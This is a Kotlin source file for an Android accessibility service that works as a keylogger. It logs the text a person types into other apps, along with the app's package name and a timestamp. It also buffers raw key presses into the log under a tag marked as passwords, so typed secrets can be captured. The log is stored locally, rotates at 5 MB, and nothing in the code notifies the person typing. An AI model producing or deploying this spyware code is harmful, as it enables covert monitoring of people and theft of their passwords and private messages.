package com.moonless.textlogger

import android.accessibilityservice.AccessibilityService
import android.content.SharedPreferences
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class TextLoggerService : AccessibilityService() {

    companion object {
        const val PREFS = "textlogger_prefs"
        const val KEY_ENABLED = "enabled"
        const val LOG_FILE = "textlog.txt"

        @Volatile
        var isRunning = false
            private set
    }

    private lateinit var prefs: SharedPreferences
    private lateinit var logFile: File
    private var lastText = ""
    
    private val keyBuffer = StringBuilder()
    private var lastPackage = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
        logFile = File(filesDir, LOG_FILE)
        isRunning = true
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (!prefs.getBoolean(KEY_ENABLED, false)) return

        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return 

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val source = event.source ?: return
                if (!source.isPassword) {
                    val currentText = source.text?.toString() ?: ""
                    if (currentText.isNotEmpty() && currentText != lastText) {
                        val delta = diffText(lastText, currentText)
                        lastText = currentText
                        if (delta.isNotEmpty()) {
                            writeLogToFile(pkg, delta, isPassword = false)
                        }
                    }
                }
                source.recycle()
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                lastText = ""
                if (pkg != lastPackage) {
                    keyBuffer.clear()
                    lastPackage = pkg
                }
            }
        }
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        event ?: return false
        if (!prefs.getBoolean(KEY_ENABLED, false)) return false
        if (event.action != KeyEvent.ACTION_DOWN) return false

        if (event.keyCode == KeyEvent.KEYCODE_SHIFT_LEFT || 
            event.keyCode == KeyEvent.KEYCODE_SHIFT_RIGHT ||
            event.keyCode == KeyEvent.KEYCODE_ALT_LEFT ||
            event.keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
            event.keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
            return false
        }

        val char = event.unicodeChar.toChar()
        val pkg = lastPackage.ifEmpty { "Tastatura" }

        when {
            event.keyCode == KeyEvent.KEYCODE_DEL -> {
                if (keyBuffer.isNotEmpty()) {
                    keyBuffer.deleteCharAt(keyBuffer.length - 1)
                }
            }
            event.keyCode == KeyEvent.KEYCODE_ENTER -> {
                if (keyBuffer.isNotEmpty()) {
                    writeLogToFile(pkg, keyBuffer.toString(), isPassword = true)
                    keyBuffer.clear()
                }
            }
            // AICI E FIX-UL: Verificam daca e caracter vizibil, prinzand simboluri si punctuatie
            event.unicodeChar != 0 && !Character.isISOControl(char) -> {
                keyBuffer.append(char)
            }
        }
        
        if (keyBuffer.length > 20) {
            writeLogToFile(pkg, keyBuffer.toString(), isPassword = true)
            keyBuffer.clear()
        }

        return false 
    }

    private fun diffText(old: String, new: String): String {
        if (old.isEmpty()) return new
        if (new.startsWith(old)) return new.substring(old.length)
        if (old.startsWith(new)) return ""
        return "\n[PASTE/REWRITE]: $new"
    }

    private fun writeLogToFile(pkg: String, text: String, isPassword: Boolean) {
        Thread {
            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                val type = if (isPassword) "[KEY]" else "[TEXT]"
                val line = "[$timestamp] $type [$pkg] $text\n"
                
                if (logFile.exists() && logFile.length() > 5 * 1024 * 1024) {
                    val backup = File(filesDir, "textlog_backup_${System.currentTimeMillis()}.txt")
                    logFile.renameTo(backup)
                }
                
                logFile.appendText(line, Charsets.UTF_8)
            } catch (_: Exception) { }
        }.start()
    }

    override fun onInterrupt() { isRunning = false }
    
    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}